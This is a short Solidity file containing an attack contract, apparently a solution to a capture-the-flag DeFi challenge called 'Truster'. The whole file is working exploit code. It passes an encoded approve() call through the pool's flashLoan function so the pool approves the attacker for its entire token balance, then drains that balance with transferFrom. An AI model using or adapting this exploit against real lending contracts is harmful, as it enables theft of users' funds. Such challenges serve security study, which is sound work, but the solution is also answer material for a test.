// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ITrusterLender{
    function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttack {

    ITrusterLender public pool;
    IERC20 public token;
    address public attacker;

    constructor(address _poolAddress, address _tokenAddress){
        pool = ITrusterLender(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }
    function attack() external{

        uint256 amount = token.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), attacker, amount);
    }
}

